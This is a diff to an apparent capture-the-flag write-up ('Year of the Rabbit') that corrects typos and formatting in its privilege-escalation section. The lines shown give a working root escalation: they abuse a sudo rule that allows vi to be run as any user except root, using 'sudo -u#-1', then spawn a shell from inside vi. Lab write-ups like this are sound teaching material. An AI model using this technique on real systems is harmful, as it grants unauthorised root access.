@@ -183,7 +183,7 @@ commands to check possibility for privesc:<br>
 <img src="./images/year_of_the_rabbit/31.png">
 </center><br><br>
 
-NOTE: sudo -l gave us (ALL, !root)NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt<br>
+NOTE: sudo -l give us (ALL, !root)NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt<br>
 It means that vi can be used to make changes as a root user to the user.txt file<br><br>
 
  
@@ -198,7 +198,8 @@ So what we must do:
 sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
 ```
 <br>
-We open a file with "vi" and below when we save it and givving a name we write:
+Once file opened and below when we save it and giving a name, we write:
+```bash
 :!bin/sh
 ```
 <br>
@@ -208,7 +209,9 @@ We open a file with "vi" and below when we save it and givving a name we write:
  
 <center>
 <img src="./images/year_of_the_rabbit/35.png">
-</center><br> 
+</center><br><br>
+
+
 <center>
 We are root!
 </center>
